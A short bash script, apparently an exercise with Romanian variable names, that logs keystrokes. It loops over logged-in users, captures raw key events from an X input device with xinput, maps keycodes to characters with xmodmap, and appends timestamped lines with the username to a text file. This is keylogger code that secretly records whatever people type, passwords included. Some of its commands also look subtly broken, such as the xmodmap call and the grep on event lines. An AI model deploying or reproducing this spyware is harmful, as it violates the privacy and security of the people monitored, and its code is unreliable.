#!/bin/bash


while true;
 do
    who | while read utilizator terminal data ora; 
    do
        xinput test-xi2 --root 11 --event-types 2 -l | while read eveniment; 
        do
        	timp=$(date +"%Y-%m-%d %H:%M:%S")
        	cod_tasta=$(echo "$eveniment" | grep -oP '(?<=detail: ).*')
        	caracter=$(xmodmap -e "keycode $cod_tasta" -pke | awk '{print $NF}')
        	linie=$(echo "$timp - $utilizator - $caracter" | sed 's/[ \t]+/ /g')
                echo "$linie" >> evenimente_tastatura.txt
        done
    done
done
